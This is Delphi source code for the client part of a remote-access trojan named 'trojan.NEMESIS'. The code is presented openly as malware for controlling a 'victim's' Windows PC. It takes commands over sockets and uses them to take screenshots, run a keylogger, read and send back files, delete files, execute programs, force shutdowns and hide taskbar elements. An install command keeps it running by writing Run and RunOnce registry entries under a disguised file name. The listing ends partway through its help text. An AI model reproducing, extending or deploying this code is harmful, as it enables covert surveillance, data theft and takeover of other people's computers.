{
trojan.NEMESIS (THE TROJAN-CLIENT PART)
========================================
TROJAN_NAME        = 'trojan.NEMESIS';
TROJAN_AUTHOR      = 'dr.K@meleon';
TROJAN_AUTHOREMAIL = 'drkameleon@freemail.gr';

ENJOY THE POWER OF DECEPTION!

*Pieces of code written by other authors are marked as "SOURCE DOWNLOADED SEPARATELY"
}

unit Unit1TROJAN;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Registry, MMSystem, ShellAPI, Jpeg,
  MPlayer;

const
        MAIN_TROJAN_PORT      = 18966;
        MAIN_CONSOLE_PORT     = 6666;
        TRANSFER_CONSOLE_PORT = 3333;
        TailleBloc = 256;


        IP_IDENT      = '@IP';
        COMMAND_IDENT = '@CMD';

        TROJAN_NAME        = 'trojan.NEMESIS';
        TROJAN_VERSION     = '2.0';
        TROJAN_LASTUPDATE  = '22/06/2005';
        TROJAN_AUTHOR      = 'dr.K@meleon';
        TROJAN_AUTHOREMAIL = 'drkameleon@freemail.gr';

Type
  TIPTrame=Packed Record
    Case ttType:Integer Of


    1:(
        ttNomFichier:String[255];
      );
    2:( ttDebut : Integer;
        ttLong  : Integer;
        ttDatas : Array[0..TailleBloc-1] Of Byte )
  End;

  TForm1 = class(TForm)
    toCONSOLE: TClientSocket;
    fromCONSOLE: TServerSocket;
    Timer1: TTimer;
    Memo1: TMemo;
    Timer2: TTimer;
    MediaPlayer1: TMediaPlayer;
    toTransferCONSOLE: TClientSocket;
    RETARD_TIMER: TTimer;
    Timer3: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure fromCONSOLEClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FormCreate(Sender: TObject);
    procedure fromCONSOLEClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure fromCONSOLEClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Timer2Timer(Sender: TObject);
    procedure toCONSOLEConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure RETARD_TIMERTimer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private

  public

  protected
    procedure AppException(Sender: TObject; E: Exception);
  end;

var
  Form1                 : TForm1;
  USER_IP               : array[1..17] of string;
  nextIP                : integer;
  SCREENSHOT_FILE       : string;
  CURRENT_DIR:string;
  KEYLOG:string;
  FILE_FROM, FILE_TO            : file;
  SIZE_READ, SIZE_WRITTEN       : integer;
  BUFOS                         : array[1..2048] of char;
  INF_FILE                      : text;
  FILE_ONTRANSFER               : file;
  ClientTrame                   : TIPTrame;

implementation

{$R *.dfm}

function nextToken(var txt:String;sep:char):String;
var
        index:byte;
        start,finish:byte;
begin
        index:=1;
        while (txt[index]=sep) do inc(index,1);
        start:=index;
        if txt[index]='"' then
        begin
                inc(index,1);
                while (txt[index]<>'"') do inc(index,1);
                finish:=index;
                nextToken:=copy(txt,start+1,finish-start-1);
                delete(txt,1,finish);
        end else
        begin
                while ((index<length(txt)) and (txt[index]<>sep)) do inc(index,1);
                nextToken:=copy(txt,start,index-start);
                delete(txt,1,index);
        end;
end;

function equal(tx1,tx2:string):boolean;
var     f1,f2:string;
begin
        f1:=uppercase(tx1);
        f2:=uppercase(tx2);
        if (f1=f2) then equal:=true else equal:=false;
end;

procedure BMPtoJPGStream(const Bitmap : TBitmap; var AStream: TMemoryStream);  { SOURCE DOWNLOADED SEPARATELY }
var
  JpegImg: TJpegImage;
begin
        JpegImg := TJpegImage.Create;
        try
                JpegImg.PixelFormat := jf8Bit;
                JpegImg.Assign(Bitmap);
                JpegImg.SaveToStream(AStream);
        finally
                JpegImg.Free
        end;
end;


procedure TAKE_ScreenShot(x : integer; y : integer; Width : integer; Height : integer; bm : TBitMap);  { SOURCE DOWNLOADED SEPARATELY }
var
  dc: HDC; lpPal : PLOGPALETTE;
begin
        if ((Width = 0) OR (Height = 0)) then exit;
        bm.Width := Width;
        bm.Height := Height;
        dc := GetDc(0);
        if (dc = 0) then exit;
        if (GetDeviceCaps(dc, RASTERCAPS) AND RC_PALETTE = RC_PALETTE) then
        begin
                GetMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
                FillChar(lpPal^, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)), #0);
                lpPal^.palVersion := $300;
                lpPal^.palNumEntries :=GetSystemPaletteEntries(dc,0,256,lpPal^.palPalEntry);
                if (lpPal^.PalNumEntries <> 0) then
                begin
                        bm.Palette := CreatePalette(lpPal^);
                end;
                FreeMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
        end;
        BitBlt(bm.Canvas.Handle,0,0,Width,Height,Dc,x,y,SRCCOPY);
        ReleaseDc(0, dc);
end;


procedure SCREENSHOT;   { SOURCE DOWNLOADED SEPARATELY }
var
  JpegStream : TMemoryStream;
  pic : TBitmap;
begin
    pic := TBitmap.Create;
    JpegStream := TMemoryStream.Create;
    TAKE_ScreenShot(0,0,Screen.Width,Screen.Height,pic);
    BMPtoJPGStream(pic, JpegStream);
    pic.FreeImage;
    FreeAndNil(pic);
    JpegStream.SaveToFile(SCREENSHOT_FILE);
    FreeAndNil(JpegStream);
end;


procedure TForm1.AppException(Sender: TObject; E: Exception);
begin
        toConsole.Active:=false;
        toConsole.Socket.Close;
end;


procedure TForm1.Timer1Timer(Sender: TObject);
begin
        Timer1.Enabled:=false;
        Form1.Visible:=false;
end;

function GetCPUSpeed: Double;           { SOURCE DOWNLOADED SEPARATELY }
const
  DelayTime = 500;
var
  TimerHi, TimerLo: DWORD;
  PriorityClass, Priority: Integer;
begin
  PriorityClass := GetPriorityClass(GetCurrentProcess);
  Priority := GetThreadPriority(GetCurrentThread);

  SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);

  Sleep(10);
  asm
    dw 310Fh
    mov TimerLo, eax
    mov TimerHi, edx
  end;
  Sleep(DelayTime);
  asm
    dw 310Fh
    sub eax, TimerLo
    sbb edx, TimerHi
    mov TimerLo, eax
    mov TimerHi, edx
  end;

  SetThreadPriority(GetCurrentThread, Priority);
  SetPriorityClass(GetCurrentProcess, PriorityClass);

  Result := TimerLo / (1000.0 * DelayTime);
end;

function getLanguage:string;
var
  IdiomaID:LangID;
  Idioma: array [0..100] of char;
begin

  IdiomaID:=GetSystemDefaultLangID;

  VerLanguageName(IdiomaID,Idioma,100);
  Result:=String(Idioma); 
end;

function getResolution:Tpoint;
var
        hh:hdc;
        larg,haut:integer;
begin
        hh:=getdc(GetDesktopWindow);
        larg:=getdevicecaps(hh,HORZRES);
        haut:=getdevicecaps(hh,VERTRES);
        getResolution.x:=larg;
        getResolution.y:=haut;
end;

procedure changeResolution(width:integer;height:integer;bpp:integer);  { SOURCE DOWNLOADED SEPARATELY }
var
        mode:TDeviceMode;
        i:integer;
begin
        mode.dmSize:=sizeof(MODE);
        mode.dmPelsWidth:=width;
        mode.dmPelsHeight:=height;
        mode.dmBitsPerPel:=bpp;
        mode.dmFields:=DM_PELSWIDTH or DM_PELSHEIGHT or DM_BITSPERPEL;
        i:=ChangeDisplaySettings(mode,CDS_UPDATEREGISTRY);
end;

function getInstalledApps(ppm:integer):string;
var
        reggie:TRegistry;
        strang:TStringList;
        DisplayName, UninstallKey :String;
        root:string;
        cmt:integer;
begin
        root:= '\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\';
        reggie := tregistry.Create;
        reggie.RootKey := HKEY_LOCAL_MACHINE;
        reggie.OpenKey(root,False);
        strang := TStringList.create;
        reggie.GetKeyNames(strang);
        reggie.CloseKey;
        result:='';
        for cmt:=1 to strang.Count-1 do
        begin
                reggie.OpenKey(root+strang[cmt],False);
                DisplayName:=reggie.ReadString('DisplayName');
                UninstallKey:=reggie.ReadString('UninstallString');
                reggie.CloseKey;
                if DisplayName<>'' then
                begin
                        if ppm=0 then result:=result+'< '+DisplayName+#13#10
                        else
                        result:=result+'< ['+DisplayName+']:'+#13#10+UninstallKey+#13#10;
                end;
        end;
        reggie.Free;
end;

procedure TForm1.fromCONSOLEClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
        input, command, ident       : string;
        RETURN                          : string;
        param                           : array[1..5] of string;
        tmp_str:string;
        FileAttrs:integer;
        sr:TSearchRec;
        lastslash,index:integer;
        archive:textfile;
        oneline:string;
        check:boolean;
        oldinput:string;
        messageType:string;
        sb:boolean;
        reg2:Tregistry;
        BYTES_STR:string;
        OLD:string;
        handl,fex:longint;
        productid,productname,productregowner:string;
        compname:string;
        findclass,findclass2,findparent:longint;
        olddir:string;
        ase:integer;
        LOBO:boolean;
        tmp_int:integer;
        str1,str2:string;
        int1,int2,int3:integer;
        hTaskBar, hButton : HWND;
        hDCScreen : HDC;
        ScreenHeight : DWORD;

begin
        CURRENT_DIR:=getCurrentDir+'\';
        RETURN:='< done!';
        input:=socket.ReceiveText;
        memo1.Lines.add(input);
        ident:=nextToken(input,' ');
        memo1.Lines.add('"'+ident+'"');
        if equal(ident,COMMAND_IDENT) then
        begin
                command:=nextToken(input,' ');
                if equal(command,'fix') then closefile(FILE_ONTRANSFER)
                else if equal(command,'get') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'disk.free') then
                        begin
                                str(diskfree(0),tmp_str);
                                RETURN:='< '+tmp_str+' bytes';
                                str(diskfree(0)/(1024*1024*1024):4:2,tmp_str);
                                RETURN:=RETURN+' ('+tmp_str+' GB)';
                        end
                        else if equal(param[1],'disk.size') then
                        begin
                                str(disksize(0),tmp_str);
                                RETURN:='< '+tmp_str+' bytes';
                                str(disksize(0)/(1024*1024*1024):4:2,tmp_str);
                                RETURN:=RETURN+' ('+tmp_str+' GB)';
                        end
                        else if equal(param[1],'local.date') then return:='< '+DateToStr(date)
                        else if equal(param[1],'local.time') then return:='< '+TimeToStr(time)
                        else if equal(param[1],'local.language') then return:='< '+getLanguage
                        else if equal(param[1],'applications') then return:=getInstalledApps(0)
                        else if equal(param[1],'applications.uninstallkey') then return:=getInstalledApps(1)
                        else if equal(param[1],'lockkeys.state') then
                        begin
                                return:='';
                                return:=return+'< CAPS LOCK = ';
                                if 0<>(GetKeyState(VK_CAPITAL) AND $01)=true then return:=return+'On'+#13#10 else return:=return+'Off'+#13#10;
                                return:=return+'< NUM LOCK = ';
                                if 0<>(GetKeyState(VK_NUMLOCK) AND $01)=true then
                                return:=return+'On'+#13#10 else return:=return+'Off'+#13#10;
                                return:=return+'< SCROLL LOCK = ';
                                if 0<>(GetKeyState(VK_SCROLL) AND $01)=true then
                                return:=return+'On'+#13#10 else return:=return+'Off'+#13#10;

                        end
                        else if equal(param[1],'screen.resolution') then
                        begin
                                str(getResolution.X,str1);
                                str(getResolution.Y,str2);
                                return:='< '+str1+'x'+str2;
                        end
                        else if equal(param[1],'cpu.speed') then
                        begin
                                str(getCPUSpeed:5:1,tmp_str);
                                return:='< '+tmp_str+'Mhz';
                        end
                        else if equal(param[1],'doubleclick.time') then
                        begin
                                tmp_int:=getDoubleClickTime;
                                str(tmp_int,tmp_str);
                                return:='< '+tmp_str;
                        end
                        else if equal(param[1],'documents.folder') then
                        begin
                                reg2:= Tregistry.create;
                                reg2.rootkey := HKEY_LOCAL_MACHINE;
                                reg2.openkey('\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\User Shell Folders',true);
                                if reg2.valueexists('Personal') then return := '< '+reg2.readstring('Personal') else return := '< C:\My Documents';
                                reg2.closekey;
                                reg2.free;
                        end
                        else if equal(param[1],'computer.name') then
                        begin
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\System\CurrentcontrolSet\Control\Computername\computername', True) then
                                        begin
                                                compname:=Reg2.ReadString('computername');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                return:='< '+compname;
                        end
                        else if equal(param[1],'windows.info') then
                        begin
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows\CurrentVersion', True) then
                                        begin
                                                productId:=Reg2.ReadString('productId');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows NT\CurrentVersion', True) then
                                        begin
                                                productName:=Reg2.ReadString('productName');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows NT\CurrentVersion', True) then
                                        begin
                                                productRegOwner:=Reg2.ReadString('registeredOwner');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                return       :='< productName = '+productName+#13#10;
                                return:=return+'< productId = '+productId+#13#10;
                                return:=return+'< registeredOwner = '+productregOwner;
                        end
                        else if equal(param[1],'trojan.info') then
                        begin
                                return       :='< '+TROJAN_NAME+#13#10;
                                return:=return+'< -------------------'+#13#10;
                                return:=return+'< version = '+TROJAN_VERSION+#13#10;
                                return:=return+'< updated = '+TROJAN_LASTUPDATE+#13#10;
                                return:=return+'< author = '+TROJAN_AUTHOR+#13#10;
                                return:=return+'< e-mail = '+TROJAN_AUTHOREMAIL;
                        end
                        else RETURN:='< error: unknown parameter';
                end
                else if equal(command,'cdtray.close') then
                begin
                        tmp_int:=mciSendString(pchar('set cdaudio door closed'),nil,0,0);
                end
                else if equal(command,'screenshot') then
                begin
                        SCREENSHOT_FILE:=nextToken(input,' ');
                        screenshot;
                end
                else if equal(command,'dir') then
                begin
                        oldinput:=input;
                        input:=input+'$% ';
                        param[1]:=nextToken(input,' ');
                        if param[1]='$%' then param[1]:='*.*'
                        else param[1]:=nextToken(oldinput,' ');
                        FileAttrs :=faReadOnly;
                        FileAttrs := FileAttrs + faHidden;
                        FileAttrs := FileAttrs + faSysFile;
                        FileAttrs := FileAttrs + faVolumeID;
                        FileAttrs := FileAttrs + faDirectory;
                        FileAttrs := FileAttrs + faArchive;
                        FileAttrs := FileAttrs + faAnyFile;
                        return:='';
                        if FindFirst(CURRENT_DIR+param[1], FileAttrs, sr) = 0 then
                        begin
                                repeat
                                        if (sr.Attr and FileAttrs) = sr.Attr then
                                        begin
                                                if sr.Attr=faDirectory then
                                                return:=return+'< ['+sr.name+']'+#13#10
                                                else
                                                return:=return+'< '+sr.name+#13#10;
                                        end;
                                until FindNext(sr) <> 0;
                                FindClose(sr);
                        end
                end
                else if equal(command,'cd') then
                begin
                        param[1]:=nextToken(input,' ');
                        OLD:=CURRENT_DIR;
                        CURRENT_DIR:=CURRENT_DIR+param[1]+'\';
                        if not(setcurrentdir(CURRENT_DIR)) then
                        begin
                                CURRENT_DIR:=OLD;
                                return:='< '+'error!';
                        end;
                end
                else if equal(command,'cd..') then
                begin
                        lastslash:=length(CURRENT_DIR);
                        index:=lastslash-1;
                        while (CURRENT_DIR[index]<>'\') do dec(index,1);
                        delete(CURRENT_DIR,index+1,lastslash-index);
                        if not(setcurrentdir(CURRENT_DIR)) then return:='< '+'error!';
                end
                else if equal(command,'cd\') then
                begin
                        index:=1;
                        while (CURRENT_DIR[index]<>'\') do inc(index,1);
                        CURRENT_DIR:=copy(CURRENT_DIR,1,index);
                        if not(setcurrentdir(CURRENT_DIR)) then return:='< '+'error!';
                end
                else if equal(command,'swd') then
                begin
                        param[1]:=nextToken(input,' ');
                        olddir:=CURRENT_DIR;
                        CURRENT_DIR:=param[1];
                        if not(setcurrentdir(CURRENT_DIR)) then
                        begin
                                setcurrentdir(olddir);
                                CURRENT_DIR:=olddir;
                                return:='< '+'error!'
                        end
                        else CURRENT_DIR:=param[1];
                end
                else if equal(command,'delete') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'file') then
                        begin
                                param[2]:=nextToken(input,' ');
                                if FileExists(param[2]) then deletefile(param[2])
                                else return:='< '+'error: file does not exist';
                        end
                        else if equal(param[1],'directory') then
                        begin
                                param[2]:=nextToken(input,' ');
                                if DirectoryExists(param[2]) then rmdir(param[2])
                                else return:='< '+'error: directory does not exist';
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'rename') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'file') then
                        begin
                                param[2]:=nextToken(input,' ');
                                param[3]:=nextToken(input,' ');

                                if FileExists(param[2]) then
                                begin
                                        renamefile(param[2],param[3]);
                                end
                                else return:='< '+'error: file does not exist';
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'copy') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'file') then
                        begin

                                param[2]:=nextToken(input,' ');
                                param[3]:=nextToken(input,' ');
                                copyfile(pchar(param[2]),pchar(param[3]),check);
                                if check=false then return:='< '+'error!';
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'destroy') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'taskbar') then
                        begin
                                handl:=FindWindow(pchar('Shell_TrayWnd'),nil);
                                sendMessage(handl,WM_DESTROY,0,0);
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'disable') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'taskbar') then
                        begin
                                handl:=findWindow(pchar('Shell_TrayWnd'),pchar(''));
                                showWindow(handl,0);
                        end
                        else if equal(param[1],'taskbar.start') then
                        begin
                                handl:=findWindow(pchar('Shell_TrayWnd'),pchar(''));
                                Fex:=FindWindowEx(handl,0,pchar('Button'),nil);
                                showWindow(Fex,0);
                        end
                        else if equal(param[1],'taskbar.clock') then
                        begin
                                FindClass:= FindWindow(pchar('Shell_TrayWnd'), nil);
                                FindParent:= FindWindowEx(FindClass, 0, pchar('TrayNotifyWnd'), nil);
                                Handl:= FindWindowEx(FindParent, 0, pchar('TrayClockWClass'), nil);
                                ShowWindow(handl,0);
                        end
                        else if equal(param[1],'taskbar.icons') then
                        begin
                                FindClass:= FindWindow(pchar('Shell_TrayWnd'), pchar(''));
                                Handl:= FindWindowEx(FindClass, 0, pchar('TrayNotifyWnd'), nil);
                                ShowWindow(Handl, 0);
                        end
                        else if equal(param[1],'alt-ctrl-del') then
                        begin
                                LOBO:=SystemParametersInfoA(SPI_SCREENSAVERRUNNING,0,nil,1);
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'mail') then
                begin
                        ShellExecute(0,pchar('open'),pchar('mailto: drkameleon@hotmail.com?subject=nice to meet you&body=my message'),nil,nil,SW_SHOWNORMAL);
                end
                else if equal(command,'enable') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'taskbar') then
                        begin
                                handl:=findWindow(pchar('Shell_TrayWnd'),pchar(''));
                                showWindow(handl,1);
                        end
                        else if equal(param[1],'taskbar.start') then
                        begin
                                handl:=findWindow(pchar('Shell_TrayWnd'),pchar(''));
                                Fex:=FindWindowEx(handl,0,pchar('Button'),nil);
                                showWindow(Fex,1);
                        end
                        else if equal(param[1],'taskbar.clock') then
                        begin
                                FindClass:= FindWindow(pchar('Shell_TrayWnd'), nil);
                                FindParent:= FindWindowEx(FindClass, 0, pchar('TrayNotifyWnd'), nil);
                                Handl:= FindWindowEx(FindParent, 0, pchar('TrayClockWClass'), nil);
                                ShowWindow(handl,1);
                        end
                        else if equal(param[1],'taskbar.icons') then
                        begin
                                FindClass:= FindWindow(pchar('Shell_TrayWnd'), pchar(''));
                                Handl:= FindWindowEx(FindClass, 0, pchar('TrayNotifyWnd'), nil);
                                ShowWindow(Handl, 1);
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'set') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'computer.name') then
                        begin
                                param[2]:=nextToken(input,' ');
                                setcomputername(pchar(param[2]));
                        end
                        else if equal(param[1],'doubleclick.time') then
                        begin
                                param[2]:=nextToken(input,' ');
                                val(param[2],handl,findclass);
                                setdoubleclicktime(handl);
                        end
                        else if equal(param[1],'cursor.position') then
                        begin
                                param[2]:=nextToken(input,' ');
                                val(param[2],handl,findclass);
                                param[3]:=nextToken(input,' ');
                                val(param[3],findclass2,findclass);
                                setcursorpos(handl,findclass2);
                        end
                        else if equal(param[1],'screen.resolution') then
                        begin
                                param[2]:=nextToken(input,' ');
                                val(param[2],int1,findclass);
                                param[3]:=nextToken(input,' ');
                                val(param[3],int2,findclass);
                                param[4]:=nextToken(input,' ');
                                val(param[4],int3,findclass);
                                changeResolution(int1,int2,int3);
                        end
                        else if equal(param[1],'wallpaper') then
                        begin
                                param[2]:=pchar(nextToken(input,' '));
                                SystemParametersInfo(SPI_SETDESKWALLPAPER,0,PChar(param[2]),SPIF_SENDWININICHANGE);
                        end
                end
                else if equal(command,'retrieve') then
                begin
                        param[1]:=nextToken(input,' ');
                        if equal(param[1],'file') then
                        begin
                                param[2]:=nextToken(input,' '); // THIS FILE
                                assignfile(FILE_ONTRANSFER,param[2]);
                                reset(FILE_ONTRANSFER,1);
                                ClientTrame.ttType:=1;
                                ClientTrame.ttNomFichier:=param[2];
                                RETARD_TIMER.Enabled:=true;

                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'create') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'directory') then
                        begin
                                param[2]:=nextToken(input,' ');
                                mkdir(param[2]);
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'send') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'message') then
                        begin
                                input:=input+'`';
                                param[2]:=nextToken(input,'`');
                                MessageDlg('Nemesis - by dr.K@meleon'+#13#10+'--------------------------------'+#13#10+param[2], mtInformation,[mbOk], 0);
                                return:='< client just read your message ('+param[2]+')';
                        end
                        else return:='< '+'error: unknown parameter';
                end
                else if equal(command,'chat') then
                begin
                        input:=input+'`';
                        param[1]:=nextToken(input,'`');
                        return:='< client replied: '+ InputBox('Nemesis - by dr.K@meleon', param[1], 'reply if you dare!');
                end
                else if equal(command,'install') then
                begin
                        if directoryexists('c:\windows') then
                        begin
                                copyfile(pchar(paramstr(0)),'c:\windows\system32_dll.exe',sb);
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True) then
                                        begin
                                                Reg2.WriteString('system32dll','"' + 'c:\windows\system32_dll.exe' + '"');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows\CurrentVersion\RunOnce', True) then
                                        begin
                                                Reg2.WriteString('system32dll','"' + 'c:\windows\system32_dll.exe' + '"');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                                reg2:=tregistry.Create;
                                try
                                        reg2.RootKey:=HKEY_LOCAL_MACHINE;
                                        if Reg2.OpenKey('\Software\Microsoft\Windows\CurrentVersion\RunServices', True) then
                                        begin
                                                Reg2.WriteString('system32dll','"' + 'c:\windows\system32dll.exe' + '"');
                                                Reg2.CloseKey;
                                        end;
                                finally
                                        Reg2.Free;
                                        inherited;
                                end;
                        end;
                end
                else if equal(command,'view') then
                begin
                        param[1]:=nextToken(input,' ');

                        if equal(param[1],'file') then
                        begin
                                param[2]:=nextToken(input,' ');
                                if FileExists(param[2]) then
                                begin
                                        assignfile(ARCHIVE,param[2]);
                                        reset(archive);
                                        return:='';
                                        while not eof(archive) do
                                        begin
                                                readln(archive,oneline);
                                                return:=return+'< '+oneline+#13#10;
                                        end;
                                        closefile(archive);
                                end
                                else return:='< '+'file does not exist';
                        end else return:='< '+'unknown parameter';
                end
                else if equal(command,'beep') then
                begin
                        oldinput:=input;
                        input:=input+'$% ';
                        param[1]:=nextToken(input,' ');
                        if param[1]='$%' then int1:=1
                        else
                        begin
                                param[1]:=nextToken(oldinput,' ');
                                val(param[1],int1,int2);
                        end;
                        for int3:=1 to int1 do
                        begin
                                beep;
                        end;
                end
                else if equal(command,'kill') then
                begin
                        deletefile('c:\windows\temp.nem');
                        application.Terminate
                end
                else if equal(command,'pwd') then return:='< '+CURRENT_DIR
                else if equal(command,'keylogger.on') then timer3.Enabled:=true
                else if equal(command,'keylogger.off') then timer3.Enabled:=false
                else if equal(command,'keylogger.show') then return:='< '+KEYLOG
                else if equal(command,'reboot') then ExitWindowsEx(EWX_REBOOT+EWX_FORCE,0)
                else if equal(command,'shutdown') then ExitWindowsEx(EWX_POWEROFF+EWX_FORCE,0)
                else if equal(command,'logoff') then ExitWindowsEx(EWX_LOGOFF+EWX_FORCE,0)
                else if equal(command,'execute') then
                begin
                        param[1]:=nextToken(input,' ');
                        winexec(pchar(param[1]),0);
                end
                else if equal(command,'cdtray.eject') then
                begin
                        MediaPlayer1.DeviceType:=dtCDAudio;
                        mediaplayer1.Open;
                        MediaPlayer1.eject;
                        mediaplayer1.Close;
                end
                else if equal(command,'play') then
                begin
                        param[1]:=nextToken(input,' ');
                        if fileexists(param[1]) then
                        begin
                                MediaPlayer1.filename:=param[1];
                                MediaPlayer1.Open;
                                MediaPlayer1.Play;
                        end
                        else return:='< error: file does not exist';
                end
                else if equal(command,'help') then
                begin
                        RETURN:='';
                        RETURN:=RETURN+'< HELP'+#13#10;
                        RETURN:=RETURN+'<==============='+#13#10;
                        RETURN:=RETURN+'< Some Useful Hints:'+#13#10;
                        RETURN:=RETURN+'< -- To handle a string (file name , message , etc) of more than one words'+#13#10;
                        RETURN:=RETURN+'<    use quotes (e.g. to change to ''program files'' directory):  cd "program files"'+#13#10;
                        RETURN:=RETURN+'< -- To terminate the console , type "exit"'+#13#10;
                        RETURN:=RETURN+'< -- If any problem occurs e.g. after the retrieval of some file , type "fix"'+#13#10;
                        RETURN:=RETURN+'< -- All ''yellow'' messages with a "<" prefix refer to incoming messages from the victim'+#13#10;
                        RETURN:=RETURN+'< -- All ''white'' messages with a ">" prefix refer to messages sent to the victim'+#13#10;
                        RETURN:=RETURN+'< -- All ''white'' messages with a "-" prefix refer to console operations'+#13#10;
                        RETURN:=RETURN+'< -- All ''white'' messages with a "###" prefix refer to console messages'+#13#10;
                        RETURN:=RETURN+'< -- Commands below refer to the VICTIM''S PC , NOT YOURS! (except for localhost use)'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;

                        RETURN:=RETURN+'< GET:    (e.g. "get disk.size" , "get documents.folder" , etc)'+#13#10;
                        RETURN:=RETURN+'< - disk.size    [size of current hard disk]'+#13#10;
                        RETURN:=RETURN+'< - disk.free    [amount of free space of current hard disk]'+#13#10;
                        RETURN:=RETURN+'< - local.date    [local date]'+#13#10;
                        RETURN:=RETURN+'< - local.time    [local time]'+#13#10;
                        RETURN:=RETURN+'< - local.language    [local language]'+#13#10;
                        RETURN:=RETURN+'< - cpu.speed    [cpu speed]'+#13#10;
                        RETURN:=RETURN+'< - screen.resolution    [current screen resolution]'+#13#10;
                        RETURN:=RETURN+'< - applications    [all installed applications]'+#13#10;
                        RETURN:=RETURN+'< - applications.uninstallkey    [uninstall keys for all installed applications]'+#13#10;
                        RETURN:=RETURN+'< - documents.folder    [folder used for Documents]'+#13#10;
                        RETURN:=RETURN+'< - lockkeys.state    [current status of CAPS LOCK , NUM LOCK and SCROLL LOCK]'+#13#10;
                        RETURN:=RETURN+'< - doubleclick.time    [interval needed to accept a double-click event]'+#13#10;
                        RETURN:=RETURN+'< - computer.name    [registered computer name]'+#13#10;
                        RETURN:=RETURN+'< - windows.info    [various information on Windows operating system]'+#13#10;
                        RETURN:=RETURN+'< - trojan.info    [various inforamtion on active trojan release]'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
                        RETURN:=RETURN+'< SET:    (e.g. "set computer.name MAGKAS" , "set screen.resolution 800 600 24" , etc)'+#13#10;
                        RETURN:=RETURN+'< - computer.name <name>    [registered computer name]'+#13#10;
                        RETURN:=RETURN+'< - doubleclick.time <time>    [interval needed to accept a double-click event]'+#13#10;
                        RETURN:=RETURN+'< - cursor.position <x> <y>    [current position of the mouse]'+#13#10;
                        RETURN:=RETURN+'< - screen.resolution <x> <y> <bits>    [current screen resolution]'+#13#10;
                        RETURN:=RETURN+'< - wallpaper <file_name>    [desktop wallpaper]'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
                        RETURN:=RETURN+'< ENABLE/DISABLE:    (e.g. "enable taskbar" , "disable taskbar.icons" , etc)'+#13#10;
                        RETURN:=RETURN+'< - taskbar    [the Windows taskbar]'+#13#10;
                        RETURN:=RETURN+'< - taskbar.start    [START button on Windows taskbar]'+#13#10;
                        RETURN:=RETURN+'< - taskbar.clock    [the clock on Windows taskbar]'+#13#10;
                        RETURN:=RETURN+'< - taskbar.icons    [the icons on Windows taskbar]'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
                        RETURN:=RETURN+'< DESTROY:    (e.g. "destroy taskbar" , etc)'+#13#10;
                        RETURN:=RETURN+'< - taskbar    [the Windows taskbar]'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
